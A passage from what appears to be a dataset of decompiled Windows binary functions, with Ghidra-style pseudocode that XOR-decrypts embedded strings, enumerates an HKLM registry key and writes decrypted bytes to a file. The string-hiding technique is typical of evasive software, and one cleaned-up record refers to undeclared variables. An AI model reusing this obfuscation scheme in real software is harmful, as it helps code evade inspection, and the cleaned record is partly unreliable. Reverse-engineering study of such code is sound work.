RegOpenKeyExW((HKEY)0xffffffff80000002,(LPCWSTR)&DAT_14003ab30,0,0xf003f,&local_70);\n}\nlocal_108 = 0x55498a9a5733769f;\nlocal_100 = 0xe5e0294ba7b8b0d0;\nlocal_f8 = 0x3f655b8c8e56c319;\nlocal_f0 = 0x9906ab75af2144aa;\nlocal_e8 = 0x78e9a3e0dbe2613;\nlocal_e0 = 0xbbbe2af35618f84;\nlocal_d8 = 0x9d7b465026754bad;\nlocal_d0 = 0x42faa5d98b27b5ee;\nlocal_c8 = 0xf64e27f2d2f2ed67;\nlocal_c0 = 0xdaf257c38fc2fbf8;\n_DAT_14003ab30 = _DAT_14003ab30 ^ 0x55498a9a5733769f;\n_DAT_14003ab38 = _DAT_14003ab38 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ab40 = _DAT_14003ab40 ^ 0x3f655b8c8e56c319;\n_DAT_14003ab48 = _DAT_14003ab48 ^ 0x9906ab75af2144aa;\n_DAT_14003ab50 = _DAT_14003ab50 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ab58 = _DAT_14003ab58 ^ 0xbbbe2af35618f84;\n_DAT_14003ab60 = _DAT_14003ab60 ^ 0x9d7b465026754bad;\n_DAT_14003ab68 = _DAT_14003ab68 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ab70 = _DAT_14003ab70 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ab78 = _DAT_14003ab78 ^ 0xdaf257c38fc2fbf8;\nif (LVar3 != 0) {\nFUN_140002b60(0x13,LVar3);\nFUN_140001b60(local_a0,0x1400315bf);\nFUN_14000c234(local_a0,&DAT_140036178);\nLAB_140003959:\nFUN_14000ed18();\npcVar2 = (code *)swi(3);\n(*pcVar2)();\nreturn;\n}\n_DAT_14003ab80 = _DAT_14003ab80 ^ 0x55498a9a5733769f;\n_DAT_14003ab88 = _DAT_14003ab88 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ab90 = _DAT_14003ab90 ^ 0x3f655b8c8e56c319;\n_DAT_14003ab98 = _DAT_14003ab98 ^ 0x9906ab75af2144aa;\nlocal_58 = 0;\nlocal_50 = 7;\nlocal_68 = L'\\0';\nparam_1[2] = 0;\nparam_1[3] = 7;\n*(undefined2 *)param_1 = 0;\nlocal_48[0] = 0x7fff;\nFUN_140008520((longlong *)&local_68,0x7fff,0,0x7fff,0);\nLAB_1400034c0:\npWVar4 = &local_68;\nif (7 < local_50) {\npWVar4 = (LPWSTR)CONCAT62(uStack_66,local_68);\n}\nLVar3 = RegEnumValueW(local_70,0,pWVar4,local_48,(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)0x0,\n(LPDWORD)0x0);\nuVar11 = local_58;\nif (LVar3 != 0) goto LAB_140003841;\nuVar13 = (ulonglong)local_48[0];\nif (local_58 < uVar13) {\nuVar9 = uVar13 - local_58;\nif (local_50 - local_58 < uVar9) {\nFUN_140008520((longlong *)&local_68,uVar9,0,uVar9,0);\n}\nelse {\nlocal_58 = uVar13;\npWVar4 = &local_68;\nif (7 < local_50) {\npWVar4 = (WCHAR *)CONCAT62(uStack_66,local_68);\n}\npWVar7 = pWVar4 + uVar11;\nuVar13 = uVar9;\nif (uVar9 != 0) {\nfor (; uVar13 != 0; uVar13 = uVar13 - 1) {\n*pWVar7 = L'\\0';\npWVar7 = pWVar7 + 1;\n}\n}\npWVar4[uVar9 + uVar11] = L'\\0';\n}\n}\nelse {\npWVar4 = &local_68;\nif (7 < local_50) {\npWVar4 = (WCHAR *)CONCAT62(uStack_66,local_68);\n}\nlocal_58 = uVar13;\npWVar4[uVar13] = L'\\0';\n}\nuVar11 = local_58;\nuVar13 = 0xffffffffffffffff;\ndo {\nuVar13 = uVar13 + 1;\n} while ((&DAT_14003ab80)[uVar13] != 0);\npWVar4 = (WCHAR *)CONCAT62(uStack_66,local_68);\npWVar7 = &local_68;\nif (7 < local_50) {\npWVar7 = pWVar4;\n}\nif (local_58 < uVar13) {\nLAB_140003698:\nuVar13 = 0xffffffffffffffff;\n}\nelse {\nif (uVar13 != 0) {\npWVar10 = pWVar7;\nwhile( true ) {\nlVar5 = (longlong)((longlong)pWVar7 + (((local_58 - uVar13) + 1) * 2 - (longlong)pWVar10))\n>> 1;\nWVar12 = (WCHAR)_DAT_14003ab80;\npWVar8 = (WCHAR *)0x0;\nif (lVar5 != 0) {\nWVar1 = *pWVar10;\nfor (; (pWVar8 = pWVar10, WVar1 != WVar12 && (pWVar8 = (WCHAR *)0x0, lVar5 != 1));\nlVar5 = lVar5 + -1) {\npWVar10 = pWVar10 + 1;\nWVar1 = *pWVar10;\n}\n}\nif (pWVar8 == (WCHAR *)0x0) break;\npuVar6 = &DAT_14003ab80;\nWVar1 = *pWVar8;\nif ((ushort)WVar12 <= (ushort)WVar1) {\nbVar14 = (ushort)WVar1 < (ushort)WVar12;\nbVar15 = WVar1 == WVar12;\nuVar9 = uVar13;\ndo {\nif (!bVar14 && !bVar15) break;\nif (uVar9 == 1) {\nuVar13 = (longlong)pWVar8 - (longlong)pWVar7 >> 1;\ngoto LAB_1400036a1;\n}\nuVar9 = uVar9 - 1;\npuVar6 = puVar6 + 1;\nbVar14 = *(ushort *)((longlong)puVar6 + (longlong)(pWVar8 + -0xa001d5c0)) < *puVar6;\nbVar15 = *(ushort *)((longlong)puVar6 + (longlong)(pWVar8 + -0xa001d5c0)) == *puVar6;\n} while (!bVar14);\n}\npWVar10 = pWVar8 + 1;\n}\ngoto LAB_140003698;\n}\nuVar13 = 0;\n}\nLAB_1400036a1:\nif (uVar13 == 0xffffffffffffffff) {\nif (local_58 < 0x7fff) {\nuVar13 = 0x7fff - local_58;\nif (local_50 - local_58 < uVar13) {\nFUN_140008520((longlong *)&local_68,uVar13,0,uVar13,0);\n}\nelse {\nlocal_58 = 0x7fff;\npWVar7 = &local_68;\nif (7 < local_50) {\npWVar7 = pWVar4;\n}\npWVar4 = pWVar7 + uVar11;\nuVar9 = uVar13;\nif (uVar13 != 0) {\nfor (; uVar9 != 0; uVar9 = uVar9 - 1) {\n*pWVar4 = L'\\0';\npWVar4 = pWVar4 + 1;\n}\n}\npWVar7[uVar13 + uVar11] = L'\\0';\n}\n}\nelse {\npWVar7 = &local_68;\nif (7 < local_50) {\npWVar7 = pWVar4;\n}\nlocal_58 = 0x7fff;\npWVar7[0x7fff] = L'\\0';\n}\ngoto LAB_1400034c0;\n}\nlocal_170 = _DAT_140032a20;\nuStack_168 = _UNK_140032a28;\nlocal_180 = 0;\nlocal_a8 = local_58;\nuVar11 = uVar13;\nif (local_58 < uVar13) {\nuVar11 = local_58;\n}\npWVar7 = &local_68;\nif (7 < local_50) {\npWVar7 = pWVar4;\n}\nlocal_40 = uVar13;\nFUN_140007c50((longlong *)&local_180,(undefined8 *)pWVar7,uVar11);\nif (param_1 == (longlong *)&local_180) {\nif (7 < uStack_168) {\nif ((0xfff < uStack_168 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_17e,local_180) -\n*(longlong *)(CONCAT62(uStack_17e,local_180) + -8)) - 8U)) goto LAB_140003959;\nthunk_FUN_14000b460();\n}\n}\nelse {\nif (7 < (ulonglong)param_1[3]) {\nif ((0xfff < param_1[3] * 2 + 2U) && (0x1f < (*param_1 - *(longlong *)(*param_1 + -8)) - 8U))\ngoto LAB_140003959;\nthunk_FUN_14000b460();\n}\nparam_1[3] = 7;\n*param_1 = CONCAT62(uStack_17e,local_180);\nparam_1[1] = lStack_178;\nparam_1[2] = local_170;\nparam_1[3] = uStack_168;\n}\nlocal_170 = _DAT_140032a20;\nuStack_168 = _UNK_140032a28;\nlocal_180 = 0;\nLAB_140003841:\n_DAT_14003ab80 = _DAT_14003ab80 ^ 0x55498a9a5733769f;\n_DAT_14003ab88 = _DAT_14003ab88 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ab90 = _DAT_14003ab90 ^ 0x3f655b8c8e56c319;\n_DAT_14003ab98 = _DAT_14003ab98 ^ 0x9906ab75af2144aa;\nif (LVar3 != 0) {\nFUN_140002b60(0x13,LVar3);\nFUN_140001b60(local_88,0x1400315bf);\nFUN_14000c234(local_88,&DAT_140036178);\npcVar2 = (code *)swi(3);\n(*pcVar2)();\nreturn;\n}\nif (7 < local_50) {\nif ((0xfff < local_50 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_66,local_68) - *(longlong *)(CONCAT62(uStack_66,local_68) + -8)) -\n8U)) {\nFUN_14000ed18();\npcVar2 = (code *)swi(3);\n(*pcVar2)();\nreturn;\n}\nthunk_FUN_14000b460();\n}\n__security_check_cookie(local_38 ^ (ulonglong)auStackY_1d8);\nreturn;\n}\nLocal Variable: local_res20 : undefined8\nLocal Variable: local_res18 : undefined8\nLocal Variable: local_res10 : undefined8\nLocal Variable: local_28 : undefined\nLocal Variable: local_38 : undefined8\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined4\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_68 : undefined8\nLocal Variable: local_70 : undefined8\nLocal Variable: local_88 : undefined\nLocal Variable: local_a0 : undefined\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b8 : undefined8\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c8 : undefined8\nLocal Variable: local_d0 : undefined8\nLocal Variable: local_d8 : undefined8\nLocal Variable: local_e0 : undefined8\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined8\nLocal Variable: local_f8 : undefined8\nLocal Variable: local_100 : undefined8\nLocal Variable: local_108 : undefined8\nLocal Variable: local_110 : undefined8\nLocal Variable: local_118 : undefined8\nLocal Variable: local_120 : undefined8\nLocal Variable: local_128 : undefined8\nLocal Variable: local_130 : undefined8\nLocal Variable: local_138 : undefined8\nLocal Variable: local_140 : undefined8\nLocal Variable: local_148 : undefined8\nLocal Variable: local_150 : undefined8\nLocal Variable: local_158 : undefined8\nLocal Variable: local_170 : undefined1[16]\nLocal Variable: local_180 : undefined1[16]\nLocal Variable: local_188 : undefined4\nLocal Variable: local_190 : undefined8\nLocal Variable: local_198 : undefined8\nLocal Variable: local_1a0 : undefined8\nLocal Variable: local_1a8 : undefined8\nLocal Variable: local_1b0 : undefined8\nLocal Variable: local_1b8 : undefined8"}
{"Function Name": "FUN_140003d40", "Address": "140003d40", "Source Code": "void FUN_140003d40(undefined8 *param_1)\n{\n    BOOL isWriteSuccessful; \n    HANDLE fileHandle; \n    LPCWSTR ***fileNamePointer; \n    undefined1 localStackSpace[32]; \n    ulonglong securityCookie; \n    ulonglong someValue; \n    LPCWSTR **fileNamePointersArray[3]; \n    DWORD bytesWrittenArray[2]; \n    \n    securityCookie = DAT_140038080 ^ (ulonglong)localStackSpace;\n    \n    \n    _DAT_14003ab10 ^= 0x55498a9a5733769f;\n    _DAT_14003ab18 ^= 0xe5e0294ba7b8b0d0;\n    _DAT_14003ab20 ^= 0x3f655b8c8e56c319;\n    _DAT_14003ab28 ^= 0x9906ab75af2144aa;\n    \n    FUN_1400081f0((longlong *)fileNamePointersArray, param_1, 0x14003ab10);\n    \n    \n    _DAT_14003ab10 ^= 0x55498a9a5733769f;\n    _DAT_14003ab18 ^= 0xe5e0294ba7b8b0d0;\n    _DAT_14003ab20 ^= 0x3f655b8c8e56c319;\n    _DAT_14003ab28 ^= 0x9906ab75af2144aa;\n    fileNamePointer = fileNamePointersArray; \n    \n    if (7 < someValue) {\n        fileNamePointer = (LPCWSTR ***)fileNamePointersArray[0]; \n    }\n    \n    fileHandle = CreateFileW((LPCWSTR)fileNamePointer, 0x10000000, 1, NULL, 1, 0x80, NULL);\n    \n    \n    if (fileHandle != (HANDLE)0xffffffffffffffff) {\n        \n        _DAT_14003aad0 ^= 0x55498a9a5733769f;\n        _DAT_14003aad8 ^= 0xe5e0294ba7b8b0d0;\n        _DAT_14003aae0 ^= 0x3f655b8c8e56c319;\n        _DAT_14003aae8 ^= 0x9906ab75af2144aa;\n        _DAT_14003aaf0 ^= 0x78e9a3e0dbe2613;\n        _DAT_14003aaf8 ^= 0xbbbe2af35618f84;\n        _DAT_14003ab00 ^= 0x9d7b465026754bad;\n        _DAT_14003ab08 ^= 0x42faa5d98b27b5ee;\n        bytesWrittenArray[0] = 0; \n        \n        \n        isWriteSuccessful = WriteFile(fileHandle, &DAT_14003aad0, 0x30, bytesWrittenArray, NULL);\n        \n        \n        _DAT_14003aad0 ^= 0x55498a9a5733769f;\n        _DAT_14003aad8 ^= 0xe5e0294ba7b8b0d0;\n        _DAT_14003aae0 ^= 0x3f655b8c8e56c319;\n        _DAT_14003aae8 ^= 0x9906ab75af2144aa;\n        _DAT_14003aaf0 ^= 0x78e9a3e0dbe2613;\n        _DAT_14003aaf8 ^= 0xbbbe2af35618f84;\n        _DAT_14003ab00 ^= 0x9d7b465026754bad;\n        _DAT_14003ab08 ^= 0x42faa5d98b27b5ee;\n        CloseHandle(fileHandle); \n        \n        \n        if (isWriteSuccessful == 0) {\n            FUN_140001b60(local_78, 0x1400315bf); \n            FUN_14000c234(local_78, &DAT_140036178); \n            ((code *)swi(3))(); \n            return; \n        }\n        \n        if (7 < someValue) {\n            \n            if ((0xfff < someValue * 2 + 2) && (0x1f < (ulonglong)((longlong)fileNamePointersArray[0] + (-8 - (longlong)fileNamePointersArray[0][-1])))) {\n                FUN_14000ed18(); \n                goto LAB_140004109; \n            }\n            thunk_FUN_14000b460(); \n        }\n    }\n    \n    __security_check_cookie(securityCookie ^ (ulonglong)localStackSpace);\n    return; \nLAB_140004109:\n    FUN_140001b60(local_90, 0x1400315bf); \n    FUN_14000c234(local_90, &DAT_140036178); \n    ((code *)swi(3))(); \n    return; \n}"}
{"Function Name": "FUN_1400049c0", "Address": "1400049c0", "Source Code": "ulonglong FUN_1400049c0(LPCWSTR param_1)\n{\ncode *pcVar1;\nint iVar2;\nulonglong uVar3;\nulonglong uVar4;\nulonglong uVar5;\nWCHAR local_440;\nundefined6 uStack_43e;\nundefined8 local_430;\nulonglong uStack_428;\nWCHAR local_420;\nundefined6 uStack_41e;\nundefined8 local_410;\nulonglong uStack_408;\nWCHAR local_400;\nundefined6 uStack_3fe;\nundefined8 local_3f0;\nulonglong uStack_3e8;\nWCHAR local_3e0;\nundefined6 uStack_3de;\nundefined8 local_3d0;\nulonglong uStack_3c8;\nWCHAR local_3c0;\nundefined6 uStack_3be;\nundefined8 local_3b0;\nulonglong uStack_3a8;\nundefined8 local_398;\nundefined8 local_390;\nundefined8 local_388;\nundefined8 local_380;\nundefined8 local_378;\nundefined8 local_370;\nundefined8 local_368;\nundefined8 local_360;\nundefined8 local_318;\nundefined8 local_310;\nundefined8 local_308;\nundefined8 local_300;\nundefined8 local_2f8;\nundefined8 local_2f0;\nundefined8 local_2e8;\nundefined8 local_2e0;\nundefined8 local_2d8;\nundefined8 local_2d0;\nundefined8 local_278;\nundefined8 local_270;\nundefined8 local_268;\nundefined8 local_260;\nundefined8 local_258;\nundefined8 local_250;\nundefined8 local_248;\nundefined8 local_240;\nundefined8 local_238;\nundefined8 local_230;\nundefined8 local_228;\nundefined8 local_220;\nundefined8 local_218;\nundefined8 local_210;\nundefined8 local_208;\nundefined8 local_200;\nundefined8 local_178;\nundefined8 local_170;\nundefined8 local_168;\nundefined8 local_160;\nundefined8 local_158;\nundefined8 local_150;\nundefined8 local_148;\nundefined8 local_140;\nundefined8 local_138;\nundefined8 local_130;\nundefined8 local_128;\nundefined8 local_120;\nundefined8 local_118;\nundefined8 local_110;\nundefined8 local_108;\nundefined8 local_100;\nundefined8 local_f8;\nundefined8 local_f0;\nundefined8 local_e8;\nundefined8 local_e0;\nundefined8 local_38;\n\nlocal_38 = 0xfffffffffffffffe;\nlocal_178 = 0x55498a9a5733769f;\nlocal_170 = 0xe5e0294ba7b8b0d0;\nlocal_168 = 0x3f655b8c8e56c319;\nlocal_160 = 0x9906ab75af2144aa;\nlocal_158 = 0x78e9a3e0dbe2613;\nlocal_150 = 0xbbbe2af35618f84;\nlocal_148 = 0x9d7b465026754bad;\nlocal_140 = 0x42faa5d98b27b5ee;\nlocal_138 = 0xf64e27f2d2f2ed67;\nlocal_130 = 0xdaf257c38fc2fbf8;\nlocal_128 = 0xe380cce41a50da01;\nlocal_120 = 0x563b5a2d27541812;\nlocal_118 = 0x3eaf6a16c9088cbb;\nlocal_110 = 0xe334bb07ec391f4c;\nlocal_108 = 0x27a7d2289c366d15;\nlocal_100 = 0xe0b3d8d1ff7c6b16;\nlocal_f8 = 0xe5eaabca35d32caf;\nlocal_f0 = 0xb80abfbe8b1e960;\nlocal_e8 = 0x45501a3cbfdc1a29;\nlocal_e0 = 0xc9ed66a55e4e253a;\n_DAT_14003aa30 = _DAT_14003aa30 ^ 0x55498a9a5733769f;\n_DAT_14003aa38 = _DAT_14003aa38 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003aa40 = _DAT_14003aa40 ^ 0x3f655b8c8e56c319;\n_DAT_14003aa48 = _DAT_14003aa48 ^ 0x9906ab75af2144aa;\n_DAT_14003aa50 = _DAT_14003aa50 ^ 0x78e9a3e0dbe2613;\n_DAT_14003aa58 = _DAT_14003aa58 ^ 0xbbbe2af35618f84;\n_DAT_14003aa60 = _DAT_14003aa60 ^ 0x9d7b465026754bad;\n_DAT_14003aa68 = _DAT_14003aa68 ^ 0x42faa5d98b27b5ee;\n_DAT_14003aa70 = _DAT_14003aa70 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003aa78 = _DAT_14003aa78 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003aa80 = _DAT_14003aa80 ^ 0xe380cce41a50da01;\n_DAT_14003aa88 = _DAT_14003aa88 ^ 0x563b5a2d27541812;\n_DAT_14003aa90 = _DAT_14003aa90 ^ 0x3eaf6a16c9088cbb;\n_DAT_14003aa98 = _DAT_14003aa98 ^ 0xe334bb07ec391f4c;\n_DAT_14003aaa0 = _DAT_14003aaa0 ^ 0x27a7d2289c366d15;\n_DAT_14003aaa8 = _DAT_14003aaa8 ^ 0xe0b3d8d1ff7c6b16;\n_DAT_14003aab0 = _DAT_14003aab0 ^ 0xe5eaabca35d32caf;\n_DAT_14003aab8 = _DAT_14003aab8 ^ 0xb80abfbe8b1e960;\n_DAT_14003aac0 = _DAT_14003aac0 ^ 0x45501a3cbfdc1a29;\n_DAT_14003aac8 = _DAT_14003aac8 ^ 0xc9ed66a55e4e253a;\nlocal_318 = 0x55498a9a5733769f;\nlocal_310 = 0xe5e0294ba7b8b0d0;\nlocal_308 = 0x3f655b8c8e56c319;\nlocal_300 = 0x9906ab75af2144aa;\nlocal_2f8 = 0x78e9a3e0dbe2613;\nlocal_2f0 = 0xbbbe2af35618f84;\nlocal_2e8 = 0x9d7b465026754bad;\nlocal_2e0 = 0x42faa5d98b27b5ee;\nlocal_2d8 = 0xf64e27f2d2f2ed67;\nlocal_2d0 = 0xdaf257c38fc2fbf8;\n_DAT_14003ac50 = _DAT_14003ac50 ^ 0x55498a9a5733769f;\n_DAT_14003ac58 = _DAT_14003ac58 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ac60 = _DAT_14003ac60 ^ 0x3f655b8c8e56c319;\n_DAT_14003ac68 = _DAT_14003ac68 ^ 0x9906ab75af2144aa;\n_DAT_14003ac70 = _DAT_14003ac70 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ac78 = _DAT_14003ac78 ^ 0xbbbe2af35618f84;\n_DAT_14003ac80 = _DAT_14003ac80 ^ 0x9d7b465026754bad;\n_DAT_14003ac88 = _DAT_14003ac88 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ac90 = _DAT_14003ac90 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ac98 = _DAT_14003ac98 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003aba0 = _DAT_14003aba0 ^ 0x55498a9a5733769f;\n_DAT_14003aba8 = _DAT_14003aba8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003abb0 = _DAT_14003abb0 ^ 0x3f655b8c8e56c319;\n_DAT_14003abb8 = _DAT_14003abb8 ^ 0x9906ab75af2144aa;\nlocal_278 = 0x55498a9a5733769f;\nlocal_270 = 0xe5e0294ba7b8b0d0;\nlocal_268 = 0x3f655b8c8e56c319;\nlocal_260 = 0x9906ab75af2144aa;\nlocal_258 = 0x78e9a3e0dbe2613;\nlocal_250 = 0xbbbe2af35618f84;\nlocal_248 = 0x9d7b465026754bad;\nlocal_240 = 0x42faa5d98b27b5ee;\nlocal_238 = 0xf64e27f2d2f2ed67;\nlocal_230 = 0xdaf257c38fc2fbf8;\nlocal_228 = 0xe380cce41a50da01;\nlocal_220 = 0x563b5a2d27541812;\nlocal_218 = 0x3eaf6a16c9088cbb;\nlocal_210 = 0xe334bb07ec391f4c;\nlocal_208 = 0x27a7d2289c366d15;\nlocal_200 = 0xe0b3d8d1ff7c6b16;\n_DAT_14003aca0 = _DAT_14003aca0 ^ 0x55498a9a5733769f;\n_DAT_14003aca8 = _DAT_14003aca8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003acb0 = _DAT_14003acb0 ^ 0x3f655b8c8e56c319;\n_DAT_14003acb8 = _DAT_14003acb8 ^ 0x9906ab75af2144aa;\n_DAT_14003acc0 = _DAT_14003acc0 ^ 0x78e9a3e0dbe2613;\n_DAT_14003acc8 = _DAT_14003acc8 ^ 0xbbbe2af35618f84;\n_DAT_14003acd0 = _DAT_14003acd0 ^ 0x9d7b465026754bad;\n_DAT_14003acd8 = _DAT_14003acd8 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ace0 = _DAT_14003ace0 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ace8 = _DAT_14003ace8 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003acf0 = _DAT_14003acf0 ^ 0xe380cce41a50da01;\n_DAT_14003acf8 = _DAT_14003acf8 ^ 0x563b5a2d27541812;\n_DAT_14003ad00 = _DAT_14003ad00 ^ 0x3eaf6a16c9088cbb;\n_DAT_14003ad08 = _DAT_14003ad08 ^ 0xe334bb07ec391f4c;\n_DAT_14003ad10 = _DAT_14003ad10 ^ 0x27a7d2289c366d15;\n_DAT_14003ad18 = _DAT_14003ad18 ^ 0xe0b3d8d1ff7c6b16;\nlocal_398 = 0x55498a9a5733769f;\nlocal_390 = 0xe5e0294ba7b8b0d0;\nlocal_388 = 0x3f655b8c8e56c319;\nlocal_380 = 0x9906ab75af2144aa;\nlocal_378 = 0x78e9a3e0dbe2613;\nlocal_370 = 0xbbbe2af35618f84;\nlocal_368 = 0x9d7b465026754bad;\nlocal_360 = 0x42faa5d98b27b5ee;\n_DAT_14003abf0 = _DAT_14003abf0 ^ 0x55498a9a5733769f;\n_DAT_14003abf8 = _DAT_14003abf8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ac00 = _DAT_14003ac00 ^ 0x3f655b8c8e56c319;\n_DAT_14003ac08 = _DAT_14003ac08 ^ 0x9906ab75af2144aa;\n_DAT_14003ac10 = _DAT_14003ac10 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ac18 = _DAT_14003ac18 ^ 0xbbbe2af35618f84;\n_DAT_14003ac20 = _DAT_14003ac20 ^ 0x9d7b465026754bad;\n_DAT_14003ac28 = _DAT_14003ac28 ^ 0x42faa5d98b27b5ee;\nlocal_430 = _DAT_140032a20;\nuStack_428 = _UNK_140032a28;\nlocal_440 = L'\\0';\nuVar3 = 0xffffffffffffffff;\nuVar4 = 0xffffffffffffffff;\ndo {\nuVar4 = uVar4 + 1;\n} while ((&DAT_14003aa30)[uVar4] != 0);\nFUN_140007c50((longlong *)&local_440,(undefined8 *)&DAT_14003aa30,uVar4);\niVar2 = FUN_140005c80(&local_440,param_1,0);\nif (7 < uStack_428) {\nif ((uStack_428 * 2 + 2 < 0x1000) ||\n((CONCAT62(uStack_43e,local_440) - *(longlong *)(CONCAT62(uStack_43e,local_440) + -8)) - 8U <\n0x20)) {\nthunk_FUN_14000b460();\ngoto LAB_140005218;\n}\nFUN_14000ed18();\nLAB_140005c61:\nFUN_14000ed18();\nLAB_140005c67:\nFUN_14000ed18();\nLAB_140005c6d:\nFUN_14000ed18();\npcVar1 = (code *)swi(3);\nuVar3 = (*pcVar1)();\nreturn uVar3;\n}\nLAB_140005218:\nlocal_430 = _DAT_140032a20;\nuStack_428 = _UNK_140032a28;\nlocal_440 = L'\\0';\nif (iVar2 == 0) {\nFUN_140002b60(0x12,0);\n}\nuVar4 = (ulonglong)(iVar2 != 0);\nlocal_3f0 = _DAT_140032a20;\nuStack_3e8 = _UNK_140032a28;\nlocal_400 = L'\\0';\nuVar5 = 0xffffffffffffffff;\ndo {\nuVar5 = uVar5 + 1;\n} while ((&DAT_14003aba0)[uVar5] != 0);\nFUN_140007c50((longlong *)&local_400,(undefined8 *)&DAT_14003aba0,uVar5);\nlocal_410 = _DAT_140032a20;\nuStack_408 = _UNK_140032a28;\nlocal_420 = L'\\0';\nuVar5 = 0xffffffffffffffff;\ndo {\nuVar5 = uVar5 + 1;\n} while ((&DAT_14003ac50)[uVar5] != 0);\nFUN_140007c50((longlong *)&local_420,(undefined8 *)&DAT_14003ac50,uVar5);\niVar2 = FUN_140005c80(&local_420,&local_400,0);\nif (7 < uStack_408) {\nif ((0xfff < uStack_408 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_41e,local_420) - *(longlong *)(CONCAT62(uStack_41e,local_420) + -8))\n- 8U)) goto LAB_140005c61;\nthunk_FUN_14000b460();\n}\nlocal_410 = _DAT_140032a20;\nuStack_408 = _UNK_140032a28;\nlocal_420 = L'\\0';\nif (7 < uStack_3e8) {\nif ((0xfff < uStack_3e8 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_3fe,local_400) - *(longlong *)(CONCAT62(uStack_3fe,local_400) + -8))\n- 8U)) goto LAB_140005c67;\nthunk_FUN_14000b460();\n}\nlocal_3f0 = _DAT_140032a20;\nuStack_3e8 = _UNK_140032a28;\nlocal_400 = L'\\0';\nif (iVar2 == 0) {\nFUN_140002b60(0x12,1);\nuVar4 = 0;\n}\nlocal_3b0 = _DAT_140032a20;\nuStack_3a8 = _UNK_140032a28;\nlocal_3c0 = L'\\0';\nuVar5 = 0xffffffffffffffff;\ndo {\nuVar5 = uVar5 + 1;\n} while ((&DAT_14003abf0)[uVar5] != 0);\nFUN_140007c50((longlong *)&local_3c0,(undefined8 *)&DAT_14003abf0,uVar5);\nlocal_3d0 = _DAT_140032a20;\nuStack_3c8 = _UNK_140032a28;\nlocal_3e0 = L'\\0';\ndo {\nuVar3 = uVar3 + 1;\n} while ((&DAT_14003aca0)[uVar3] != 0);\nFUN_140007c50((longlong *)&local_3e0,(undefined8 *)&DAT_14003aca0,uVar3);\niVar2 = FUN_140005c80(&local_3e0,&local_3c0,1);\nif (7 < uStack_3c8) {\nif ((0xfff < uStack_3c8 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_3de,local_3e0) - *(longlong *)(CONCAT62(uStack_3de,local_3e0) + -8))\n- 8U)) goto LAB_140005c6d;\nthunk_FUN_14000b460();\n}\nlocal_3d0 = _DAT_140032a20;\nuStack_3c8 = _UNK_140032a28;\nlocal_3e0 = L'\\0';\nif (7 < uStack_3a8) {\nif ((0xfff < uStack_3a8 * 2 + 2) &&\n(0x1f < (CONCAT62(uStack_3be,local_3c0) - *(longlong *)(CONCAT62(uStack_3be,local_3c0) + -8))\n- 8U)) {\nFUN_14000ed18();\npcVar1 = (code *)swi(3);\nuVar3 = (*pcVar1)();\nreturn uVar3;\n}\nthunk_FUN_14000b460();\n}\nlocal_3b0 = _DAT_140032a20;\nuStack_3a8 = _UNK_140032a28;\nlocal_3c0 = L'\\0';\nif (iVar2 == 0) {\nFUN_140002b60(0x12,2);\nuVar4 = 0;\n}\n_DAT_14003aa30 = _DAT_14003aa30 ^ 0x55498a9a5733769f;\n_DAT_14003aa38 = _DAT_14003aa38 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003aa40 = _DAT_14003aa40 ^ 0x3f655b8c8e56c319;\n_DAT_14003aa48 = _DAT_14003aa48 ^ 0x9906ab75af2144aa;\n_DAT_14003aa50 = _DAT_14003aa50 ^ 0x78e9a3e0dbe2613;\n_DAT_14003aa58 = _DAT_14003aa58 ^ 0xbbbe2af35618f84;\n_DAT_14003aa60 = _DAT_14003aa60 ^ 0x9d7b465026754bad;\n_DAT_14003aa68 = _DAT_14003aa68 ^ 0x42faa5d98b27b5ee;\n_DAT_14003aa70 = _DAT_14003aa70 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003aa78 = _DAT_14003aa78 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003aa80 = _DAT_14003aa80 ^ 0xe380cce41a50da01;\n_DAT_14003aa88 = _DAT_14003aa88 ^ 0x563b5a2d27541812;\n_DAT_14003aa90 = _DAT_14003aa90 ^ 0x3eaf6a16c9088cbb;\n_DAT_14003aa98 = _DAT_14003aa98 ^ 0xe334bb07ec391f4c;\n_DAT_14003aaa0 = _DAT_14003aaa0 ^ 0x27a7d2289c366d15;\n_DAT_14003aaa8 = _DAT_14003aaa8 ^ 0xe0b3d8d1ff7c6b16;\n_DAT_14003aab0 = _DAT_14003aab0 ^ 0xe5eaabca35d32caf;\n_DAT_14003aab8 = _DAT_14003aab8 ^ 0xb80abfbe8b1e960;\n_DAT_14003aac0 = _DAT_14003aac0 ^ 0x45501a3cbfdc1a29;\n_DAT_14003aac8 = _DAT_14003aac8 ^ 0xc9ed66a55e4e253a;\n_DAT_14003ac50 = _DAT_14003ac50 ^ 0x55498a9a5733769f;\n_DAT_14003ac58 = _DAT_14003ac58 ^ 